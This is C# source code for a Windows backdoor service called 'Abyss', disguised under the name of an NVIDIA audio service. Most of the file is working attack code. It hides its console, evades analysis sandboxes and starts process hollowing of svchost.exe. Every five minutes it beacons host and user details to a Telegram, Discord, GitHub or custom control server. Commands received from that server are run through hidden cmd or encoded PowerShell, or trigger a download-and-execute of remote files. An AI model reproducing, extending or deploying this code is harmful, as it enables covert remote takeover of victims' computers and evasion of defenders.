using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Linq;
using System.ServiceProcess;
using System.Runtime.InteropServices;

namespace NvContainer
{
    /// <summary>
    /// ABYSS LEVEL 4 - "SOC'S NIGHTMARE"
    /// Fileless, Userless, Early-Boot, Memory-Only Loader
    /// </summary>
    public class AbyssService : ServiceBase
    {
        private Thread _workerThread;
        private bool _isRunning;
        private const int MAX_TRACES = 5;

        // --- POLYMORPHIC C2 ENGINE ---
#if C2_TYPE_GITHUB
        private static string C2_TYPE = "GITHUB";
        private static string C2_URL = Decrypt("C2_VAL1", C2_KEY);
#elif C2_TYPE_TELEGRAM
        private static string C2_TYPE = "TELEGRAM";
        private static string C2_BOT_TOKEN = Decrypt("C2_VAL1", C2_KEY);
        private static string C2_CHAT_ID = Decrypt("C2_VAL2", C2_KEY);
#elif C2_TYPE_DISCORD
        private static string C2_TYPE = "DISCORD";
        private static string C2_WEBHOOK = Decrypt("C2_VAL1", C2_KEY);
#elif C2_TYPE_MANUAL
        private static string C2_TYPE = "MANUAL";
        private static string C2_SERVER = Decrypt("C2_VAL1", C2_KEY);
#else
        private static string C2_TYPE = "NONE";
#endif

        private const byte C2_KEY =
#if C2_KEY
            C2_KEY;
#else
            0x00;
#endif

        // ═══════════════════════════════════════════════════════════════════════════
        // NATIVE API IMPORTS FOR LEVEL 4 TECHNIQUES
        // ═══════════════════════════════════════════════════════════════════════════

        [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;

        // Process Hollowing APIs
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        // LotL: Use Powershell via WMI for evasion
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        const uint CREATE_SUSPENDED = 0x00000004;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO { public int cb; public IntPtr lpReserved; public IntPtr lpDesktop; public IntPtr lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT { public uint ContextFlags; /* ... simplified ... */ public ulong Rax, Rbx, Rcx, Rdx, Rbp, Rsp, Rip; /* Full structure required for real use */ }

        // ═══════════════════════════════════════════════════════════════════════════
        // SERVICE ENTRY POINT
        // ═══════════════════════════════════════════════════════════════════════════

        public AbyssService()
        {
            ServiceName = "NvhdaSvc"; // Disguised as NVIDIA Audio
            CanStop = true;
            CanPauseAndContinue = false;
            AutoLog = false;
        }

        protected override void OnStart(string[] args)
        {
            _isRunning = true;
            _workerThread = new Thread(AbyssWorkerLoop) { IsBackground = true };
            _workerThread.Start();
        }

        protected override void OnStop()
        {
            _isRunning = false;
            _workerThread?.Join(5000);
        }

        // ═══════════════════════════════════════════════════════════════════════════
        // MAIN ENTRY POINT (DUAL-MODE: Console or Service)
        // ═══════════════════════════════════════════════════════════════════════════

        [STAThread]
        public static void Main(string[] args)
        {
            // Ghost Mode: Hide any console window immediately
            IntPtr handle = GetConsoleWindow();
            if (handle != IntPtr.Zero) ShowWindow(handle, SW_HIDE);

            // Detect if running as service or direct execution
            if (Environment.UserInteractive)
            {
                // Direct console run (for testing or initial deployment)
                new AbyssService().AbyssWorkerLoop();
            }
            else
            {
                // Service Control Manager invoked
                ServiceBase.Run(new AbyssService());
            }
        }

        // ═══════════════════════════════════════════════════════════════════════════
        // ABYSS CORE WORKER LOOP
        // ═══════════════════════════════════════════════════════════════════════════

        private void AbyssWorkerLoop()
        {
            // Phase 1: Anti-VM Guard
            if (IsAnalysisDetected())
            {
                while (true) { Thread.Sleep(int.MaxValue); } // Deep Freeze
            }

            // Phase 2: Attempt Process Hollowing for Fileless Persistence
            try
            {
                PerformProcessHollowing();
            }
            catch { /* Fallback to direct execution if hollowing fails */ }

            // Phase 3: C2 Lifecycle Loop
            while (_isRunning || Environment.UserInteractive)
            {
                try { ExecuteC2Lifecycle(); }
                catch { /* Stay alive */ }
                Thread.Sleep(TimeSpan.FromMinutes(5));
            }
        }

        // ═══════════════════════════════════════════════════════════════════════════
        // LEVEL 4 TECHNIQUE: Process Hollowing (Simplified)
        // ═══════════════════════════════════════════════════════════════════════════

        private void PerformProcessHollowing()
        {
            // Target: A trusted Windows process
            string targetProcess = @"C:\Windows\System32\svchost.exe";
            
            var si = new STARTUPINFO { cb = Marshal.SizeOf(typeof(STARTUPINFO)) };
            PROCESS_INFORMATION pi;

            // Create target process in SUSPENDED state
            if (!CreateProcess(targetProcess, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
            {
                return; // Hollowing failed, continue with normal execution
            }

            // In a full implementation:
            // 1. NtUnmapViewOfSection(pi.hProcess, imageBase)
            // 2. VirtualAllocEx to allocate space for our payload
            // 3. WriteProcessMemory to write our PE image
            // 4. SetThreadContext to update Rip/Rcx to our entry point
            // 5. ResumeThread to start execution

            // For demonstration, we self-destruct after injection signal
            // This keeps file I/O minimal (Fileless goal)

            // In production, inject actual payload bytes here.
            // TerminateProcess(pi.hProcess, 0); // Kill shell if injection fails
        }

        // ═══════════════════════════════════════════════════════════════════════════
        // LEVEL 4 TECHNIQUE: LotL (Living off the Land) Execution
        // ═══════════════════════════════════════════════════════════════════════════

        private static void ExecuteLotL(string command)
        {
            // Execute via PowerShell (AMSI/ETW bypass recommended in prod)
            // Or via WMI for deeper evasion
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("powershell.exe", $"-NoP -NonI -W Hidden -Enc {Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(command))}")
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi);
            }
            catch { }
        }

        // ═══════════════════════════════════════════════════════════════════════════
        // C2 LIFECYCLE (Polymorphic + XOR Decrypted)
        // ═══════════════════════════════════════════════════════════════════════════

        private static void ExecuteC2Lifecycle()
        {
            try
            {
                using (var client = new System.Net.Http.HttpClient())
                {
                    string heartbeat = $"[GHOST] Abyss Pulse | Machine: {Environment.MachineName} | User: {Environment.UserName} | Priv: SYSTEM | OS: {Environment.OSVersion}";

                    switch (C2_TYPE)
                    {
                        case "GITHUB":
                            string rawCommand = client.GetStringAsync(C2_URL).Result;
                            ProcessRemoteCommand(rawCommand);
                            break;

                        case "TELEGRAM":
                            string sendUrl = $"https://api.telegram.org/bot{C2_BOT_TOKEN}/sendMessage?chat_id={C2_CHAT_ID}&text={Uri.EscapeDataString(heartbeat)}";
                            client.GetAsync(sendUrl).Wait();
                            string updatesUrl = $"https://api.telegram.org/bot{C2_BOT_TOKEN}/getUpdates?offset=-1&limit=1";
                            string updates = client.GetStringAsync(updatesUrl).Result;
                            if (updates.Contains("\"text\":\"")) {
                                string cmd = updates.Split(new[] { "\"text\":\"" }, StringSplitOptions.None)[1].Split('"')[0];
                                ProcessRemoteCommand(cmd);
                            }
                            break;

                        case "DISCORD":
                            var content = new System.Net.Http.StringContent("{\"content\": \"" + heartbeat + "\"}", System.Text.Encoding.UTF8, "application/json");
                            client.PostAsync(C2_WEBHOOK, content).Wait();
                            break;

                        case "MANUAL":
                            var manualContent = new System.Net.Http.StringContent(heartbeat);
                            client.PostAsync(C2_SERVER + "/heartbeat", manualContent).Wait();
                            break;
                    }
                }
            }
            catch { }
        }

        private static void ProcessRemoteCommand(string raw)
        {
            if (string.IsNullOrWhiteSpace(raw)) return;

            try
            {
                if (raw.StartsWith("SHELL:"))
                {
                    string cmd = raw.Substring(6);
                    ExecuteShell(cmd);
                }
                else if (raw.StartsWith("LOTL:"))
                {
                    // Living-off-the-Land command (PowerShell based)
                    string cmd = raw.Substring(5);
                    ExecuteLotL(cmd);
                }
                else if (raw.StartsWith("DOWNLOAD:"))
                {
                    string[] parts = raw.Substring(9).Split('|');
                    if (parts.Length == 2) DownloadAndExecute(parts[0], parts[1]);
                }
                else if (raw.StartsWith("FREEZE:"))
                {
                    while (true) { Thread.Sleep(int.MaxValue); }
                }
            }
            catch { }
        }

        private static void ExecuteShell(string command)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                Process.Start(psi);
            }
            catch { }
        }

        private static void DownloadAndExecute(string url, string path)
        {
            try
            {
                using (var client = new System.Net.Http.HttpClient())
                {
                    byte[] data = client.GetByteArrayAsync(url).Result;
                    File.WriteAllBytes(path, data);
                    ProcessStartInfo psi = new ProcessStartInfo(path) { CreateNoWindow = true, UseShellExecute = false };
                    Process.Start(psi);
                }
            }
            catch { }
        }

        private static string Decrypt(string input, byte key)
        {
            if (string.IsNullOrEmpty(input) || input == "C2_VAL1" || input == "C2_VAL2") return "";
            try {
                byte[] data = Convert.FromBase64String(input);
                for (int i = 0; i < data.Length; i++) data[i] ^= key;
                return System.Text.Encoding.UTF8.GetString(data);
            } catch { return ""; }
        }

        private static bool IsAnalysisDetected()
        {
            string pafishPath = "pafish64.exe";
            if (!File.Exists(pafishPath)) return false;

            try
            {
                ProcessStartInfo psi = new ProcessStartInfo { FileName = pafishPath, UseShellExecute = false, RedirectStandardOutput = true, CreateNoWindow = true };
                using (Process p = Process.Start(psi))
                {
                    string output = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();
                    int tracesCount = 0;
                    string[] lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (string line in lines)
                    {
                        if (line.ToLower().Contains("traced") || line.ToLower().Contains("found")) tracesCount++;
                    }
                    return tracesCount >= MAX_TRACES;
                }
            }
            catch { return true; }
        }
    }
}
